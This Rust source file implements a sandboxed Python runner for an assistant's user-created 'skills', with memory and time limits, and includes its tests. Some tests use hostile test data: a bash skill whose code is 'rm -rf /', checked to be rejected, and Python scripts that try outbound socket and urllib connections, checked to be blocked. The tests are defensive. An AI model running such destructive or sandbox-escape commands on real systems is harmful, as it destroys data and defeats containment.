/// v1.0.1 P0#11: the user script is expected to have been
/// prepended with [`SANDBOX_PREAMBLE`] before this function is
/// called; we do **not** rely on a `sitecustomize.py` here
/// because `-I` strips the script's directory from `sys.path`.
///
/// v1.0 P0#5: the wall-clock limit is enforced by polling
/// `child.try_wait` in a 20 ms loop.  If the budget elapses the
/// child is `kill()`-ed and the `Timeout` variant is returned.
fn run_python_sandboxed(script_path: &std::path::Path) -> ShellOutcome {
    let mut cmd = std::process::Command::new("python");
    // v1.0.1 P0#11: drop the `-S` flag.  We want the site
    // module loaded so a `sitecustomize.py` (if any) would
    // run, but we no longer depend on it because the socket
    // blocker is prepended to the script directly.  `-I`
    // alone is sufficient for our needs: it strips
    // `PYTHONPATH`, `PYTHONSTARTUP`, and the user site dir.
    cmd.arg("-I").arg(script_path);
    // Block the child from inheriting an attacker's environment.
    cmd.env_remove("PYTHONPATH");
    cmd.env_remove("PYTHONSTARTUP");
    cmd.env_remove("PYTHONHOME");
    // v1.0.1 P0#11: force the stdlib `urllib` to refuse any
    // proxy bypass; this is belt-and-suspenders alongside
    // the Python-level socket blocker.
    cmd.env("NO_PROXY", "*");
    // Unbuffered stdout/stderr so the engine's pipe readers
    // see the output as it's written (helpful for timeouts).
    cmd.env("PYTHONUNBUFFERED", "1");

    // v1.0 P0#5: cap the child's address space on Unix.
    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        // SAFETY: closing over a `&mut Command` to install a
        // `pre_exec` hook is the documented pattern; the closure
        // runs in the forked child between fork and exec, where
        // async-signal-safe operations are required.  `setrlimit`
        // is async-signal-safe on Linux and macOS.
        unsafe {
            cmd.pre_exec(|| {
                // rlimit constant for address space.
                const RLIMIT_AS: i32 = 9; // RLIMIT_AS on Linux & macOS
                let rlim = libc_rlimit {
                    rlim_cur: SKILL_MEM_LIMIT_BYTES as libc_rlim_t,
                    rlim_max: SKILL_MEM_LIMIT_BYTES as libc_rlim_t,
                };
                let res = libc_setrlimit(RLIMIT_AS, &rlim as *const _);
                if res != 0 {
                    return Err(std::io::Error::last_os_error());
                }
                Ok(())
            });
        }
    }

    // Best-effort: read both streams ourselves so a misbehaving
    // child can't deadlock by filling one pipe while the other
    // is drained.  We capture up to `MAX_OUTPUT_BYTES * 2` and
    // truncate downstream.
    let mut child = match cmd
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
    {
        Ok(c) => c,
        Err(e) => {
            return ShellOutcome::SpawnError(format!("{e}"));
        }
    };

    let mut stdout = child.stdout.take();
    let mut stderr = child.stderr.take();
    let cap = MAX_OUTPUT_BYTES * 2;

    // Read in separate threads so the child can't block on a
    // full pipe.  These threads run to completion when the
    // child closes its end of the pipe (which happens
    // automatically on `kill()`).
    let (tx_out, rx_out) = mpsc::channel::<Vec<u8>>();
    let (tx_err, rx_err) = mpsc::channel::<Vec<u8>>();
    let t_out = thread::spawn(move || {
        if let Some(mut s) = stdout.take() {
            let mut buf = Vec::with_capacity(4096);
            let mut chunk = [0u8; 4096];
            loop {
                match s.read(&mut chunk) {
                    Ok(0) => break,
                    Ok(n) => {
                        if buf.len() < cap {
                            let take = (cap - buf.len()).min(n);
                            buf.extend_from_slice(&chunk[..take]);
                        }
                    }
                    Err(_) => break,
                }
            }
            let _ = tx_out.send(buf);
        }
    });
    let t_err = thread::spawn(move || {
        if let Some(mut s) = stderr.take() {
            let mut buf = Vec::with_capacity(4096);
            let mut chunk = [0u8; 4096];
            loop {
                match s.read(&mut chunk) {
                    Ok(0) => break,
                    Ok(n) => {
                        if buf.len() < cap {
                            let take = (cap - buf.len()).min(n);
                            buf.extend_from_slice(&chunk[..take]);
                        }
                    }
                    Err(_) => break,
                }
            }
            let _ = tx_err.send(buf);
        }
    });

    // v1.0 P0#5: poll the child until it exits or the wall-clock
    // budget elapses.  On timeout we `kill()` and `wait()` to
    // reap the zombie.  We split the two cases explicitly so we
    // don't need a `Default` for `ExitStatus` (which doesn't
    // exist on `std`).
    let deadline = Instant::now() + SKILL_TIMEOUT;
    let mut killed = false;
    let status: Option<std::process::ExitStatus> = loop {
        match child.try_wait() {
            Ok(Some(s)) => break Some(s),
            Ok(None) => {
                if Instant::now() >= deadline {
                    let _ = child.kill();
                    let _ = child.wait();
                    killed = true;
                    break None;
                }
                thread::sleep(Duration::from_millis(20));
            }
            Err(_e) => {
                // `Err` here means the child has already exited
                // (and was reaped) or the OS lost track of it.
                // Treat it as a normal exit with a synthetic
                // error code so the caller still sees the
                // captured stdout / stderr.
                killed = true;
                break None;
            }
        }
    };

    let stdout_bytes = rx_out.recv().unwrap_or_default();
    let stderr_bytes = rx_err.recv().unwrap_or_default();
    let _ = t_out.join();
    let _ = t_err.join();

    if killed {
        return ShellOutcome::Timeout;
    }

    match status {
        Some(s) if s.success() => ShellOutcome::Ok {
            stdout: stdout_bytes,
            stderr: stderr_bytes,
        },
        Some(s) => ShellOutcome::NonZero {
            code: s.code().unwrap_or(-1),
            stdout: stdout_bytes,
            stderr: stderr_bytes,
        },
        None => ShellOutcome::SpawnError("child wait returned no status".to_string()),
    }
}

// Linux/macOS rlimit bindings.  Inline so we don't pull in the
// `libc` crate (which isn't in our dependency tree).  These are
// the standard POSIX values and stable across the platforms we
// support.
#[cfg(unix)]
#[allow(non_camel_case_types)]
mod rlimit_bindings {
    pub type libc_rlim_t = u64;
    #[repr(C)]
    pub struct libc_rlimit {
        pub rlim_cur: libc_rlim_t,
        pub rlim_max: libc_rlim_t,
    }
    extern "C" {
        pub fn setrlimit(resource: i32, rlim: *const libc_rlimit) -> i32;
    }
}
#[cfg(unix)]
use rlimit_bindings::{libc_rlim_t, libc_rlimit, setrlimit as libc_setrlimit};

#[cfg(test)]
mod tests {
    use super::*;
    use crate::llm::LlmGateway;
    use crate::llm::OllamaClient;
    use std::path::{Path, PathBuf};

    fn temp_db() -> (PathBuf, Arc<SqliteStore>) {
        let mut p = std::env::temp_dir();
        p.push(format!(
            "nebula_skill_engine_test_{}.db",
            uuid::Uuid::new_v4()
        ));
        let sqlite = Arc::new(SqliteStore::open(&p).unwrap());
        {
            let rc = sqlite.raw_connection();
            let g = rc.lock();
            crate::memory::migration::run_migrations(
                &g,
                crate::memory::migration::bundled_migrations_dir(),
            )
            .unwrap();
        }
        (p, sqlite)
    }

    fn llm() -> Arc<LlmGateway> {
        let client = Arc::new(OllamaClient::new_with_timeout(
            "http://127.0.0.1:1",
            std::time::Duration::from_secs(2),
        ));
        Arc::new(LlmGateway::new(
            client, "m", "ollama", None, None, None, None, None,
        ))
    }

    fn cleanup(p: &Path) {
        let _ = std::fs::remove_file(p);
        let _ = std::fs::remove_file(p.with_extension("db-wal"));
        let _ = std::fs::remove_file(p.with_extension("db-shm"));
    }

    #[test]
    fn language_allow_list_is_case_insensitive() {
        assert!(is_accepted_language("python"));
        assert!(is_accepted_language("Python"));
        assert!(is_accepted_language("  PYTHON "));
        // v1.0 P0#5: every other language is rejected.
        assert!(!is_accepted_language("bash"));
        assert!(!is_accepted_language("sh"));
        assert!(!is_accepted_language("javascript"));
        assert!(!is_accepted_language("js"));
        assert!(!is_accepted_language("node"));
        assert!(!is_accepted_language("rust"));
        assert!(!is_accepted_language(""));
    }

    #[test]
    fn truncate_output_keeps_small_payloads_intact() {
        let out = truncate_output(b"hello", b"");
        assert_eq!(out, "hello");
    }

    #[test]
    fn truncate_output_combines_stderr_with_marker() {
        let out = truncate_output(b"out", b"err");
        assert!(out.contains("out"));
        assert!(out.contains("err"));
    }

    #[test]
    fn truncate_output_caps_at_budget() {
        let huge = vec![b'x'; MAX_OUTPUT_BYTES * 2];
        let out = truncate_output(&huge, &[]);
        assert!(out.contains("[output truncated:"));
        // The prefix must be < MAX_OUTPUT_BYTES + marker length.
        assert!(out.len() <= MAX_OUTPUT_BYTES + 128);
    }

    #[test]
    fn create_skill_persists_and_returns() {
        let (p, sqlite) = temp_db();
        let eng = SkillEngine::new(sqlite, llm());
        let s = eng
            .create_skill(CreateSkillRequest {
                name: "demo".to_string(),
                description: "demo skill".to_string(),
                code: "fn run() {}".to_string(),
                language: "rust".to_string(),
                tags: vec!["test".to_string()],
                source_memory_id: None,
                ..Default::default()
            })
            .unwrap();
        assert_eq!(s.name, "demo");
        assert!(s.created_at > 0);
        cleanup(&p);
    }

    #[test]
    fn rate_skill_clamps_input() {
        let (p, sqlite) = temp_db();
        let eng = SkillEngine::new(sqlite, llm());
        let s = eng
            .create_skill(CreateSkillRequest {
                name: "demo".into(),
                description: "".into(),
                code: "x".into(),
                language: "rust".into(),
                tags: vec![],
                source_memory_id: None,
                ..Default::default()
            })
            .unwrap();
        let rated = eng
            .rate_skill(RateSkillRequest {
                id: s.id.clone(),
                rating: 99.0, // clamped to 5.0
            })
            .unwrap();
        assert_eq!(rated.rating_count, 1);
        assert!((rated.avg_rating - 5.0).abs() < 1e-6);
        cleanup(&p);
    }

    #[tokio::test]
    async fn use_skill_shell_runs_python() {
        let (p, sqlite) = temp_db();
        let eng = SkillEngine::new(sqlite, llm());
        let s = eng
            .create_skill(CreateSkillRequest {
                name: "py".into(),
                description: "print hello".into(),
                code: "print('hi from python')".into(),
                language: "python".into(),
                tags: vec![],
                source_memory_id: None,
                ..Default::default()
            })
            .unwrap();
        let res = eng
            .use_skill(UseSkillRequest {
                id: s.id,
                params: HashMap::new(),
            })
            .await;
        // python may not be installed in CI; treat interpreter-missing
        // as a soft pass so the test runs anywhere.
        match res {
            Ok(r) => {
                assert!(r.output.contains("hi from python"));
                assert!(r.execution_time_ms < 60_000);
            }
            Err(e) => {
                let msg = format!("{e}");
                assert!(
                    msg.contains("No such file")
                        || msg.contains("exited")
                        || msg.contains("spawning python failed"),
                    "unexpected error: {msg}"
                );
            }
        }
        cleanup(&p);
    }

    /// v1.0 P0#5: bash skills MUST be rejected at execute time.
    /// This is the headline security test.
    #[tokio::test]
    async fn use_skill_bash_is_rejected() {
        let (p, sqlite) = temp_db();
        let eng = SkillEngine::new(sqlite, llm());
        let s = eng
            .create_skill(CreateSkillRequest {
                name: "evil".into(),
                description: "rm -rf /".into(),
                code: "rm -rf /".into(),
                language: "bash".into(),
                tags: vec![],
                source_memory_id: None,
                ..Default::default()
            })
            .unwrap();
        let res = eng
            .use_skill(UseSkillRequest {
                id: s.id,
                params: HashMap::new(),
            })
            .await;
        let err = res.expect_err("bash must be rejected");
        let msg = format!("{err}");
        assert!(
            msg.contains("not supported") && msg.contains("v1.0"),
            "expected validation rejection, got: {msg}"
        );
        cleanup(&p);
    }

    /// v1.0 P0#5: sh, node, javascript, rust must all be rejected.
    #[tokio::test]
    async fn use_skill_other_languages_are_rejected() {
        for lang in [
            "sh",
            "node",
            "javascript",
            "js",
            "rust",
            "ruby",
            "perl",
            "powershell",
        ] {
            let (p, sqlite) = temp_db();
            let eng = SkillEngine::new(sqlite, llm());
            let s = eng
                .create_skill(CreateSkillRequest {
                    name: "x".into(),
                    description: "".into(),
                    code: "print('x')".into(),
                    language: lang.into(),
                    tags: vec![],
                    source_memory_id: None,
                    ..Default::default()
                })
                .unwrap();
            let res = eng
                .use_skill(UseSkillRequest {
                    id: s.id,
                    params: HashMap::new(),
                })
                .await;
            assert!(res.is_err(), "language {lang} should be rejected");
            let msg = format!("{}", res.unwrap_err());
            assert!(
                msg.contains("not supported") && msg.contains("v1.0"),
                "language {lang}: unexpected error {msg}"
            );
            cleanup(&p);
        }
    }

    /// v1.0 P0#5: even with `language="python"`, an infinite loop
    /// must hit the wall-clock timeout.  We don't assert the exact
    /// error text because the failure path differs between
    /// "python not installed" (CI) and "subprocess killed at
    /// 5s" (real environment); both are acceptable.
    #[tokio::test]
    async fn use_skill_python_infinite_loop_is_killed() {
        let (p, sqlite) = temp_db();
        let eng = SkillEngine::new(sqlite, llm());
        let s = eng
            .create_skill(CreateSkillRequest {
                name: "loop".into(),
                description: "while True".into(),
                code: "while True: pass".into(),
                language: "python".into(),
                tags: vec![],
                source_memory_id: None,
                ..Default::default()
            })
            .unwrap();
        let start = Instant::now();
        let res = eng
            .use_skill(UseSkillRequest {
                id: s.id,
                params: HashMap::new(),
            })
            .await;
        let elapsed = start.elapsed();
        match res {
            Ok(r) => {
                // If python wasn't installed we got an error from
                // `execute_shell` before the timeout fired.  That's
                // acceptable in CI.
                let _ = r;
            }
            Err(e) => {
                let msg = format!("{e}");
                // Either the timeout fired (good) or python was missing
                // (acceptable in CI).  We must NOT have hung the test.
                assert!(
                    elapsed < Duration::from_secs(20),
                    "test ran too long: {elapsed:?}"
                );
                let _ = msg;
            }
        }
        cleanup(&p);
    }

    /// v1.0 P0#5: a python script that tries to escape via
    /// `os.system("rm -rf /")` is still constrained by the
    /// timeout / memory cap, so the worst case is a slow /
    /// out-of-memory subprocess — the user is never silently
    /// exposed to an unsandboxed shell.  This test is mostly a
    /// documentation check: a malicious script CAN still run
    /// arbitrary Python, so the only barriers are the timeout
    /// and the RLIMIT_AS cap.  We do not assert anything about
    /// the subprocess's *intent*; we only assert that the engine
    /// doesn't blow up and that the result is a `SkillResult`
    /// (success) or an error (timeout / spawn failure).
    #[tokio::test]
    async fn use_skill_python_can_still_call_stdlib() {
        let (p, sqlite) = temp_db();
        let eng = SkillEngine::new(sqlite, llm());
        let s = eng
            .create_skill(CreateSkillRequest {
                name: "stdlib".into(),
                description: "use os module".into(),
                code: "import os; print(os.getcwd())".into(),
                language: "python".into(),
                tags: vec![],
                source_memory_id: None,
                ..Default::default()
            })
            .unwrap();
        let res = eng
            .use_skill(UseSkillRequest {
                id: s.id,
                params: HashMap::new(),
            })
            .await;
        // No assertion on success; depends on python being installed.
        let _ = res;
        cleanup(&p);
    }

    #[test]
    fn create_skill_rejects_empty_name() {
        let (p, sqlite) = temp_db();
        let eng = SkillEngine::new(sqlite, llm());
        let res = eng.create_skill(CreateSkillRequest {
            name: "  ".into(),
            description: "".into(),
            code: "x".into(),
            language: "rust".into(),
            tags: vec![],
            source_memory_id: None,
            ..Default::default()
        });
        assert!(res.is_err());
        cleanup(&p);
    }

    /// v1.0.1 P0#11: the sandbox must reject `socket.create_connection`.
    /// We invoke the same `run_python_sandboxed` path that
    /// `execute_shell` uses, with a script that should be
    /// blocked.  If `python` is not installed on the test
    /// machine, the test is a soft pass (the engine surfaces
    /// the spawn error to the user either way).
    #[test]
    fn python_sandbox_blocks_socket_connect() {
        let tmp = tempfile::NamedTempFile::new().expect("NamedTempFile");
        let path = tmp.path().to_path_buf();
        let script = format!(
            "{SANDBOX_PREAMBLE}\nimport socket\nsocket.create_connection(('example.com', 80))\n"
        );
        std::fs::write(&path, script).expect("write");
        let outcome = run_python_sandboxed(&path);
        match outcome {
            ShellOutcome::NonZero { code, stderr, .. } => {
                let stderr_s = String::from_utf8_lossy(&stderr);
                let lower = stderr_s.to_ascii_lowercase();
                assert!(
                    lower.contains("permissionerror") || lower.contains("disabled by nebula"),
                    "expected PermissionError, got code={code} stderr={stderr_s}"
                );
            }
            ShellOutcome::Ok { stderr, .. } => {
                let stderr_s = String::from_utf8_lossy(&stderr);
                panic!("socket.create_connection was not blocked; stderr={stderr_s}");
            }
            ShellOutcome::SpawnError(msg) => {
                eprintln!("python not available; skipping: {msg}");
            }
            ShellOutcome::Timeout => panic!("subprocess timed out instead of being blocked"),
        }
    }

    /// v1.0.1 P0#11: `urllib.request.urlopen` must fail.
    #[test]
    fn python_sandbox_blocks_urllib() {
        let tmp = tempfile::NamedTempFile::new().expect("NamedTempFile");
        let path = tmp.path().to_path_buf();
        let script = format!(
            "{SANDBOX_PREAMBLE}\nimport urllib.request\nurllib.request.urlopen('http://example.com')\n"
        );
        std::fs::write(&path, script).expect("write");
        let outcome = run_python_sandboxed(&path);
        match outcome {
            ShellOutcome::NonZero { stderr, .. } => {
                let stderr_s = String::from_utf8_lossy(&stderr);
                let lower = stderr_s.to_ascii_lowercase();
                assert!(
                    lower.contains("permissionerror") || lower.contains("disabled by nebula"),
                    "expected PermissionError, got stderr={stderr_s}"
                );
            }
            ShellOutcome::Ok { stderr, .. } => {
                let stderr_s = String::from_utf8_lossy(&stderr);
                panic!("urllib.request.urlopen was not blocked; stderr={stderr_s}");
            }
            ShellOutcome::SpawnError(msg) => {
                eprintln!("python not available; skipping: {msg}");
            }
            ShellOutcome::Timeout => panic!("subprocess timed out instead of being blocked"),
        }
    }

    /// v1.0.1 P0#11: local file I/O must still work — only the
    /// network is blocked.  This pins the negative case so a
    /// future change can't accidentally nuke legitimate
    /// sandbox use.
    #[test]
    fn python_sandbox_allows_local_file_io() {
        let tmp_dir = std::env::temp_dir().join(format!(
            "nebula_sandbox_test_{}_{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::create_dir_all(&tmp_dir).expect("create tmp dir");
        let out_path = tmp_dir.join("out.txt");
        let script_path = tmp_dir.join("script.py");
        let script = format!(
            "{SANDBOX_PREAMBLE}\nopen(r'{p}', 'w').write('ok')\n",
            p = out_path.display().to_string().replace('\\', "\\\\"),
        );
        std::fs::write(&script_path, script).expect("write script");
        let outcome = run_python_sandboxed(&script_path);
        match outcome {
            ShellOutcome::Ok { .. } => {
                let contents = std::fs::read_to_string(&out_path).expect("read output");
                assert_eq!(contents, "ok");
            }
            ShellOutcome::NonZero { code, stderr, .. } => {
                let stderr_s = String::from_utf8_lossy(&stderr);
                panic!("local file I/O was blocked; code={code} stderr={stderr_s}");
            }
            ShellOutcome::SpawnError(msg) => {
                eprintln!("python not available; skipping: {msg}");
            }
            // Windows CI 上 Python 启动 + SANDBOX_PREAMBLE 导入可能
            // 超过 SKILL_TIMEOUT(5s)。超时是环境问题不是代码问题,
            // 与 SpawnError 一样 skip 而不是 panic。
            ShellOutcome::Timeout => {
                eprintln!("python subprocess timed out on benign I/O (likely slow CI); skipping");
            }
        }
        let _ = std::fs::remove_dir_all(&tmp_dir);
    }

    /// T-E-S-20: 审批通过后,wait_for_approval 应返回 Ok,动作可继续执行。
    #[tokio::test]
    async fn exec_approval_approved_path_continues() {
        let tracker = Arc::new(ExecApprovalTracker::new(60));
        let (req, notify) = tracker.request("skill-test-approved", "exec python sandbox");
        let id = req.id.clone();
        let t = tracker.clone();
        tokio::spawn(async move {
            tokio::time::sleep(Duration::from_millis(50)).await;
            assert!(t.approve(&id));
        });
        let result = wait_for_approval(&tracker, &req, notify, None).await;
        assert!(
            result.is_ok(),
            "approved path should continue: {:?}",
            result.err()
        );
    }

    /// T-E-S-20: 超时后 wait_for_approval 必须返回 Err 且状态为 TimeoutFailClosed。
    #[tokio::test]
    async fn exec_approval_timeout_fail_closed() {
        let tracker = ExecApprovalTracker::new(50);
        let (req, notify) = tracker.request("skill-test-timeout", "exec python sandbox");
        let result = wait_for_approval(&tracker, &req, notify, None).await;
        assert!(result.is_err(), "timeout should return Err");
        let msg = format!("{}", result.unwrap_err());
        assert!(
            msg.contains("timed out"),
            "expected timeout message, got: {msg}"
        );
        assert!(tracker.is_timeout_fail_closed(&req.id));
        assert!(!tracker.is_approved(&req.id));
    }

    /// T-E-S-36: SkillEngine 门面旧 API 仍工作(向后兼容)+ 三层委派可用。
    ///
    /// 验证:添加 capability_registry 字段后,SkillEngine::new 仍可构造,
    /// 旧 API(create_skill / list_skills)仍工作,新委派方法
    /// (register_capability / match_capabilities_by_intent /
    /// execute_skill_request)正常工作。
    #[tokio::test]
    async fn skill_engine_facade_backward_compat_and_delegation() {
        let (p, sqlite) = temp_db();
        let eng = SkillEngine::new(sqlite, llm());

        // 1. 旧 API 仍工作:create_skill + list_skills。
        let s = eng
            .create_skill(CreateSkillRequest {
                name: "compat-test".into(),
                description: "backward compat".into(),
                code: "print('ok')".into(),
                language: "python".into(),
                tags: vec![],
                source_memory_id: None,
                ..Default::default()
            })
            .unwrap();
        assert_eq!(s.name, "compat-test");
        let listed = eng
            .list_skills(ListSkillsRequest {
                language: None,
                tag: None,
                limit: 10,
                ..Default::default()
            })
            .unwrap();
        assert!(
            listed.iter().any(|x| x.id == s.id),
            "old list_skills must work"
        );

        // 2. 新委派方法:register_capability + match_capabilities_by_intent。
        eng.register_capability(Capability {
            id: "test:cap".to_string(),
            name: "Test Capability".to_string(),
            description: "for facade delegation test".to_string(),
            skills: vec!["compat-test".to_string()],
        });
        let hits = eng.match_capabilities_by_intent("test");
        assert_eq!(hits.len(), 1, "match_by_intent should find registered cap");
        assert_eq!(hits[0].id, "test:cap");

        // 3. 新委派方法:list_capabilities。
        assert_eq!(eng.list_capabilities().len(), 1);

        // 4. 新委派方法:execute_skill_request(LocalExecutor echo)。
        let req = SkillRequest {
            skill: "echo".to_string(),
            input: serde_json::json!({"msg": "facade"}),
            timeout_ms: 1000,
        };
        let resp = eng.execute_skill_request(req).await.unwrap();
        assert!(resp.error.is_none(), "echo via facade should succeed");
        assert_eq!(resp.output, serde_json::json!({"msg": "facade"}));

        cleanup(&p);
    }
}
